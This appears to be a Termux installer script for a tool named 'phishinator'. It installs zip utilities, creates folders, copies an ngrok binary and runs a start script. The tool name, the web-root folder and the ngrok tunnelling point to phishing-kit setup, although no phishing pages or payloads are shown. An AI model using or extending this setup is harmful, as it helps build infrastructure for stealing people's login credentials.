termux-setup-storage
clear
echo "Installing..."
pkg install zip -y
pkg install unzip -y
mkdir "/sdcard/download/www.philiphacker.in"
mkdir "/sdcard/download/www.philiphacker.in/phishinator"
cp update /sdcard/download/www.philiphacker.in/phishinator/
cp uninstall /sdcard/www.philiphacker.in/phishinator/
mkdir "/sdcard/htdocs"
cp ngrok "/data/data/com.termux/files/usr/bin/"
echo 1 > check.io
sh start